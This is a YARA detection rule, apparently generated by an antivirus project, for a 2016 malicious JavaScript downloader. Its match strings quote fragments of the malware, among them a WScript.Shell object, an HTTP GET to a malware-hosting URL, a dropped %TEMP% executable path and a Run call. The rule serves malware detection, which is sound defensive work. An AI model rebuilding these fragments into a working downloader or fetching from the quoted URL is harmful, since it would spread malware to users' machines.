rule sig_20160329_4beb48cb074e9ac783ee5a5a23e3d554 {
  meta:
    description = "datamaliciousorder - file 20160329_4beb48cb074e9ac783ee5a5a23e3d554.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a407ac967bf828fad1072d53baf5707e4ed1139f7fff0c202fdceb3cefd47076"

  strings:
    $s1  = "function Esqqdn() {return Kcdlcxdkbd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rAD0TeOh1JCq4.exe\";};" fullword ascii
    $s2  = "Fepfv[Ahcfqzcc](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Knpdvoizlb](Dtlqx() * 11)} while (Fepfv[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Cnnfievsq(Znepiicedb, Siehungiq){return Znepiicedb - Siehungiq;};" fullword ascii
    $s5  = "var Kcdlcxdkbd = function Neiuvxyuxi() {return WScript[Rhgju](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Dbuqzrb(Wfnqmii){Kcdlcxdkbd[\"Run\"](Wfnqmii, Sznyhheet, Sznyhheet);};" fullword ascii
    $s7  = "function Hkdhhwx() {return ((Ioghzsleni == true) && (Ioghzsleni == Gdbbjo)) ? 1 : Sznyhheet;};" fullword ascii
    $s8  = "function Genbvyaj()" fullword ascii
    $s9  = "var Gdbbjo = false;" fullword ascii
    $s10 = "function Tobarmlfhb(){return Gyiir;};" fullword ascii
    $s11 = "var Knavb = new this[\"Date\"]();" fullword ascii
    $s12 = "function Ddkdneft(){return Rhgju;};" fullword ascii
    $s13 = " while (Pxlkqocemn){" fullword ascii
    $s14 = "function Dtlqx(){return 22;};" fullword ascii
    $s15 = "Gdbbjo = true; " fullword ascii
    $s16 = "function Zeedbjy(Ceicd) {var Fuobnczpr = (1, 2, 3, 4, 5, Ceicd); return Fuobnczpr;};" fullword ascii
    $s17 = "var Ioghzsleni = false;" fullword ascii
    $s18 = "return Cnnfievsq(Mcuptwb, Uqxyw);" fullword ascii
    $s19 = "var Wfmjyr = false;" fullword ascii
    $s20 = "Ioghzsleni = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}